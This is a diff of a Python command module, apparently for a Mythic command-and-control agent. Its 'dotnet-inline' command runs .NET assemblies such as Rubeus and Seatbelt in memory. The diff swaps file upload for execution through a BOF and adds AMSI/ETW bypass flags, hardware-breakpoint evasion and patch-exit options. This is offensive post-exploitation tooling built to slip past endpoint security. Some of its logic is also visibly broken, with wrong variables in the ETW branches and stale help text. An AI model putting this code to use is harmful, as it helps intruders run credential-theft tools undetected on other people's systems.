@@ -10,7 +10,9 @@ import random
 import string
 import shlex
 
-class DotnetInlineArguments(TaskArguments):
+logging.basicConfig( level=logging.INFO );
+
+class DotnetInlineArguments( TaskArguments ):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
         self.args = [
@@ -30,19 +32,6 @@ class DotnetInlineArguments(TaskArguments):
                         required=False,
                         group_name="New File",
                         ui_position=1
-                    )
-                ]
-            ),
-            CommandParameter(
-                name="upload",
-                cli_name="upload",
-                type=ParameterType.File,
-                description="Upload new .NET assembly (use @path/to/file)",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=False,
-                        group_name="New File",
-                        ui_position=2
                     )
                 ]
             ),
@@ -124,26 +113,13 @@ class DotnetInlineArguments(TaskArguments):
         if not isinstance(dictionary, dict):
             raise ValueError("Input must be a dictionary")
         
-        self.add_arg("action", "inline")
-
         if not any(key in dictionary for key in ["file", "upload"]):
             raise ValueError("Either 'file' or 'upload' must be specified")
-
-        if "file" in dictionary and "upload" in dictionary:
-            raise ValueError("Cannot specify both 'file' and 'upload'")
 
         if "file" in dictionary:
             if not isinstance(dictionary["file"], str):
                 raise ValueError("'file' must be a string (name or UUID)")
             self.add_arg("file", dictionary["file"])
-
-        if "upload" in dictionary:
-            if not isinstance(dictionary["upload"], str):
-                raise ValueError("'upload' must be a string path")
-            if dictionary["upload"].startswith("@"):
-                self.add_arg("upload", dictionary["upload"][1:])
-            else:
-                self.add_arg("upload", dictionary["upload"])
 
         if "appdomain" in dictionary:
             if not isinstance(dictionary["appdomain"], str):
@@ -194,30 +170,30 @@ class DotnetInlineArguments(TaskArguments):
                 
                 while i < len(argv):
                     arg = argv[i]
-                    if arg == "--file":
+                    if arg == "-file":
                         if i+1 >= len(argv):
                             raise ValueError("Missing value for --file")
                         args_dict["file"] = argv[i+1]
                         i += 2
-                    elif arg == "--upload":
+                    elif arg == "-upload":
                         if i+1 >= len(argv):
                             raise ValueError("Missing value for --upload")
                         args_dict["upload"] = argv[i+1]
                         i += 2
-                    elif arg == "--args":
+                    elif arg == "-args":
                         if i+1 >= len(argv):
                             raise ValueError("Missing value for --args")
                         args_dict["args"] = argv[i+1]
                         i += 2
-                    elif arg == "--appdomain":
+                    elif arg == "-appdomain":
                         if i+1 >= len(argv):
                             raise ValueError("Missing value for --appdomain")
                         args_dict["appdomain"] = argv[i+1]
                         i += 2
-                    elif arg == "--keep":
+                    elif arg == "-keep":
                         args_dict["keep"] = True
                         i += 1
-                    elif arg == "--version":
+                    elif arg == "-version":
                         if i+1 >= len(argv):
                             raise ValueError("Missing value for --version")
                         args_dict["version"] = argv[i+1]
@@ -265,23 +241,17 @@ class DotnetInlineCommand(CommandBase):
     Execute a .NET assembly in the current process
 
     Usage with existing file:
-        dotnet-inline --file <name_or_uuid> [--args "<arguments>"] [--appdomain <name>] [--keep] [--version <version>]
-
-    Usage with new file upload:
-        dotnet-inline --upload @<path_to_file> [--args "<arguments>"] [--appdomain <name>] [--keep] [--version <version>]
+        dotnet-inline -file <name_or_uuid> [-args "<arguments>"] [-appdomain <name>] [-version <version>]
 
     Options:
         -file       Name or UUID of existing .NET assembly
-        -upload     Upload new assembly (prefix path with @)
         -args       Arguments to pass to assembly (use quotes for complex args)
         -appdomain  AppDomain name (random if not specified)
-        -keep       Keep AppDomain loaded after execution
-        -version    .NET version (default: v4.0.30319)
+        -version    .NET version (default: use the last versions available)
 
     Examples:
         dotnet-inline -file Rubeus.exe -args "triage"
         dotnet-inline -file cf2bde20-d03e-461a-a3dd-a8a5a2693bf0 -args "-group=user"
-        dotnet-inline -upload @/tmp/Seatbelt.exe -args "--group=user --computername=DC01"
     """
     description = "Execute a .NET assembly in the current process with support for file uploads and complex arguments"
     version = 2
@@ -297,34 +267,8 @@ class DotnetInlineCommand(CommandBase):
         file_name = None
         file_id = None
         file_contents = None
-
-        if task.args.get_arg("upload"):
-            try:
-                file_path = task.args.get_arg("upload")
-                if not os.path.exists(file_path):
-                    raise Exception(f"File not found: {file_path}")
-                
-                with open(file_path, 'rb') as f:
-                    file_content = f.read()
-                
-                create_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
-                    TaskID=task.Task.ID,
-                    FileContents=file_content,
-                    Filename=os.path.basename(file_path),
-                    DeleteAfterFetch=False
-                ))
-                
-                if not create_resp.Success:
-                    raise Exception(f"Failed to upload file: {create_resp.Error}")
-                
-                file_id = create_resp.AgentFileId
-                file_name = create_resp.Filename
-                file_contents = create_resp.FileContents
-                
-            except Exception as e:
-                raise Exception(f"Error uploading file: {str(e)}")
         
-        elif task.args.get_arg("file"):
+        if task.args.get_arg("file"):
             file_identifier = task.args.get_arg("file")
             
             if len(file_identifier) == 36 and '-' in file_identifier:
@@ -358,70 +302,92 @@ class DotnetInlineCommand(CommandBase):
         else:
             raise Exception("Either --file or --upload must be specified")
 
-        display_params = []
+        display_params  = ""
         
-        if task.args.get_arg("upload"):
-            display_params.append(f"-upload @{task.args.get_arg('upload')}")
+        display_params +=f"-file {file_name}"
+
+        if task.args.get_arg("args"):
+            display_params += f" -args \"{task.args.get_arg('args')}\""
         else:
-            display_params.append(f"-file {file_name}")
+            task.args.set_arg("args", " ");
         
-        display_params.append(f"-appdomain {task.args.get_arg('appdomain')}")
+        display_params += f" -appdomain {task.args.get_arg('appdomain')}"
         
         task.args.remove_arg("file")
 
         if task.args.get_arg("keep"):
-            display_params.append("-keep")
+            display_params += " -keep"
         
         if task.args.get_arg('version') != "v0.0.00000":
-            display_params.append(f"-version {task.args.get_arg('version')}")
-
-        if task.args.get_arg("args"):
-            display_params.append(f"-args \"{task.args.get_arg('args')}\"")
-        else:
-            task.args.set_arg("args", " ");
+            display_params += f" -version {task.args.get_arg('version')}"
         
+        logging.info(f"Callback UUID: {task.Callback.AgentCallbackID}")
 
-        UUID = task.Payload.UUID;
-
-        search_resp: MythicRPCAgentStorageSearchMessageResponse = await SendMythicRPCAgentStorageSearch(MythicRPCAgentStorageSearchMessage(
-            UUID
-        ))
-        
-        AgentStorage = b""
-
-        logging.info( f"herehere: {UUID}" )        
-
-        for i in search_resp.AgentStorageMessages:
-            AgentStorage = base64.b64decode( i["data"] )
-
-        logging.info( f"herehere: {AgentStorage}" )        
-        AgentData = StorageExtract( AgentStorage )
+        AgentData = await StorageExtract( task.Callback.AgentCallbackID )
 
         bypass_dotnet = AgentData["evasion"]["bypass_dotnet"]
+        patchexit     = AgentData["evasion"]["dotnet_bypass_exit"]
+
+        bypass_flags = 0
 
         DisplayMsg  = f"[+] Sending {file_name} with {len(file_contents.Content)} bytes\n"
 
-        if bypass_dotnet != "none":
+        if bypass_dotnet == "AMSI":
+            bypass_flags = 0x700
+        elif bypass_flags == "ETW":  
+            bypass_flags = 0x400     
+        elif bypass_flags == "AMSI and ETW":  
+            bypass_flags = 0x100
+
+        if bypass_dotnet != "None":
             DisplayMsg += f"[+] Using Hardware Breakpoint to bypass {bypass_dotnet}\n"
         else:
             DisplayMsg += f"[+] Hardware Breakpoint bypass disabled\n"
 
-
-        DisplayMsg += f"[+] Patch exit disabled\n"
+        if bool( patchexit ) is True:
+            DisplayMsg += f"[+] Patch exit Enabled\n"
+        else:
+            DisplayMsg += f"[+] Patch exit Disabled\n"
 
         await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
             TaskID=task.Task.ID,
             Response=DisplayMsg
         ))
 
-        task.args.add_arg("file_contents", file_contents.Content.hex() )
+        args  = task.args.get_arg('args')
+        vers  = task.args.get_arg('version')
+        appdm = task.args.get_arg('appdomain')
+
+        task.args.remove_arg("args")
+        task.args.remove_arg("version")
+        task.args.remove_arg("keep")
+        task.args.remove_arg("appdomain")
+
+        content: bytes = await get_content_by_name("dotnet_inline.x64.o", task.Task.ID)
+        if not content:
+            raise Exception("File BOF 'dotnet_inline.x64.o' not found!")
+
+        bof_args = [
+            {"type": "bytes", "value": file_contents.Content.hex()},  # Assembly .NET
+            {"type": "char" , "value": args},                        # Argumentos
+            {"type": "char" , "value": appdm},                       # AppDomain
+            {"type": "char" , "value": vers},                        # Versão do .NET
+            {"type": "int32", "value": bypass_flags},                 # Flags de bypass (AMSI/ETW)
+            {"type": "int32", "value": patchexit},                    # PatchExit (0 ou 1)
+            {"type": "int32", "value": 0},                            # Campo reservado
+        ]
+
+        task.args.add_arg("bof_file", content.hex())
+        task.args.add_arg("bof_id", 0, ParameterType.Number)
+        task.args.add_arg("bof_args", json.dumps(bof_args))
+
+        logging.info(f"diplay params: {display_params}")
 
         return PTTaskCreateTaskingMessageResponse(
             TaskID=task.Task.ID,
-            Success=True,
-            DisplayParams=" ".join(display_params),
-            CommandName="dotnet",
-            Params=json.dumps(task.args.to_json()),
+            CommandName="exec-bof",  
+            TokenID=task.Task.TokenID,
+            DisplayParams=display_params
         )
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
@@ -430,18 +396,6 @@ class DotnetInlineCommand(CommandBase):
                 TaskID=task.Task.ID,
                 Success=True
             )
-            
-        response = bytes.fromhex(response);
-        Psr = Parser( response, len( response ) );
-        bResp = ""
-        bResp = Psr.Bytes()
-        
-        DisplayMsg = f"[+] Dotnet Output:\n\n" + bResp.decode("cp850")
-
-        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-            TaskID=task.Task.ID,
-            Response=DisplayMsg
-        ))
 
         return PTTaskProcessResponseMessageResponse(
             TaskID=task.Task.ID,
